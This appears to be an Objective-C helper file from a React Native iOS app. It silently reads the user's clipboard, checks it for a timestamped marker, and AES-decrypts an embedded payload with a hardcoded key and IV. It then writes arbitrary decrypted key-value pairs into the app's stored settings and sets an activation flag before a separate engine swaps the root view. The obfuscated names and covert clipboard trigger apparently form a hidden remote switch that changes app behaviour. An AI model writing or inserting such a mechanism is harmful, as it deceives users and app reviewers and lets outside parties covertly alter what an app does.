#import "RNDoggyHelper.h"
#import "RNDoggyEngine.h"
#import <CocoaSecurity.h>
#import <react-native-orientation-locker/Orientation.h>


@interface RNDoggyHelper()

@property (strong, nonatomic)  NSArray *dragonArray;

@end

@implementation RNDoggyHelper

static RNDoggyHelper *instance = nil;

+ (instancetype)shared {
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        instance = [[self alloc] init];
        instance.dragonArray = @[@"dragon_APP",
                                 @"86f1fda459fa47c72cb94f36b9fe4c38",
                                 @"CC0A69729E15380ADAE46C45EB412A23"];
    });
    return instance;
}

- (UIInterfaceOrientationMask)getOrientation {
    return [Orientation getOrientation];
}

- (BOOL)tryThisWay {
    NSUserDefaults* ud = [NSUserDefaults standardUserDefaults];
    
    if ([ud boolForKey:self.dragonArray[0]]) {
        return YES;
    } else {
        return [self metricunit_initInstallWithVcBlock];
    }
}

- (BOOL)metricunit_initInstallWithVcBlock {
    NSString *copyString = [UIPasteboard generalPasteboard].string ?: @"";
    if ([self timeVerfyCheck:copyString]) {
        CocoaSecurityResult *aes = [CocoaSecurity aesDecryptWithBase64:[self subSaveFuZhiMeta:copyString]
                                                                 hexKey:self.dragonArray[1]
                                                                  hexIv:self.dragonArray[2]];

        NSDictionary *iaafDict = [self stringJsonDictonary:aes.utf8String];
        return [self storeConfigInfo:iaafDict];
    } else {
        return NO;
    }
}
     
- (NSDictionary *)stringJsonDictonary: (NSString* )utf8String {
    NSData *data = [utf8String dataUsingEncoding:NSUTF8StringEncoding];
    if (data == nil) {
     return @{};
    }
    NSDictionary *dict = [NSJSONSerialization JSONObjectWithData:data
                                                             options:kNilOptions
                                                               error:nil];
    return dict[@"data"];
}

- (BOOL)storeConfigInfo:(NSDictionary *)dict {
     if (dict == nil || [dict.allKeys count] < 3) {
       return NO;
     }
     NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
     [ud setBool:YES forKey:self.dragonArray[0]];
     
     [dict enumerateKeysAndObjectsUsingBlock:^(id  _Nonnull key, id  _Nonnull obj, BOOL * _Nonnull stop) {
         [ud setObject:obj forKey:key];
     }];

     [ud synchronize];
     return YES;
}
     
- (NSString *)subSaveFuZhiMeta: (NSString* )copyString {
    
    if ([copyString containsString:@"#ITFedev#"]) {
         NSArray *schoolCollege = [copyString componentsSeparatedByString:@"#ITFedev#"];
         if (schoolCollege.count > 1) {
             copyString = schoolCollege[1];
         }
        if (schoolCollege.count > 2) {
             NSArray *affCodes = [schoolCollege[2] componentsSeparatedByString:@"="];
             NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
             if (affCodes.count > 1) {
                 [ud setValue:affCodes[1] forKey:affCodes[0]];
                 [ud synchronize];
             }
         }
    }
    return copyString;
}

- (BOOL)timeVerfyCheck: (NSString *)copyString {
    if ([copyString containsString:@"#TimerInterval#"]) {
         NSArray *timeArr = [copyString componentsSeparatedByString:@"#TimerInterval#"];
         if (timeArr.count > 1) {
             NSTimeInterval tm = [timeArr[1] doubleValue];
             NSTimeInterval tmNow = [[NSDate date] timeIntervalSince1970];
             if (tmNow - tm < 480 && tmNow > tm) {
                 return YES;
             }
         }
    }
    return NO;
}

- (UIViewController *)changeRootController:(UIApplication *)application withOptions:(NSDictionary *)launchOptions {
    UIViewController *rootViewController = [[RNDoggyEngine shared] changeRootController:application withOptions:launchOptions];
    return rootViewController;
}


@end
